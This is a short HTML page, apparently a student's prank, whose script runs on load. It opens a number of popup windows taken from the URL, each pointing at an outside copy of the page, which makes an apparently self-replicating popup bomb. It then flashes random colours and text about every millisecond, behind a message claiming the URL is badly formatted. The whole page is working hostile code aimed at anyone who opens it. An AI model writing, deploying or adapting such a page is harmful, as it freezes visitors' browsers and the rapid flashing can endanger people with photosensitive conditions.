<!DOCTYPE HTML>

<html>
    <head>
        <meta charset="utf-8">

        <title>Placeholder</title>
                <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

    </head>

    <body onload="execute()" style="background-color:#1a1a1a">
        <div style="text-align:center">
        <p id="text" style="font-family:'Segoe UI'; color:white; font-size:30px;word-break: break-all;">If you see this message, the URL is not formatted correctly.</p>

  <label style="font-size:90px">Qasim Iqbal 10B</label>

        </div>
 <script>


           function makeid(length) {
               var result   = '';
               var characters  = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
               var charactersLength = characters.length;
               for ( var i = 0; i < length; i++ ) {
               result += characters.charAt(Math.floor(Math.random() * 
               charactersLength));
               }
               return result;
            }

           function windowOpen(url, amount) {

               for (let i = 0; i < amount; i++) {   
            const rndInt = Math.floor(Math.random() * 1000) + 10;
            const rndInt2 = Math.floor(Math.random() * 1000) + 10;
            window.open(url, "_blank", "resizable=yes, scrollbars=yes, titlebar=yes, width=" + rndInt + ", height=" + rndInt2 + ", top=" + rndInt + ", left=" + rndInt2 + "");
               }
             }


            function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
} 


        async function execute(){
            var segments = window.location.href.split("?")
            tabamount = segments[1];
            windowOpen("https://www.gcse.gq?" + tabamount, tabamount)
            for (let i = 0; i < 1000; i++) {   
            document.title = makeid(9);
            document.getElementById("text").innerHTML = makeid(1000);
            var randomColor = "#000000".replace(/0/g,function(){return (~~(Math.random()*16)).toString(16);});
            var randomColor2 = "#000000".replace(/0/g,function(){return (~~(Math.random()*16)).toString(16);});
            document.body.style.backgroundColor = randomColor;
            document.getElementById("text").style.color = randomColor2;
            await sleep(1);
            }
  
        }

        
         
        </script>


        
    </body>

</html>
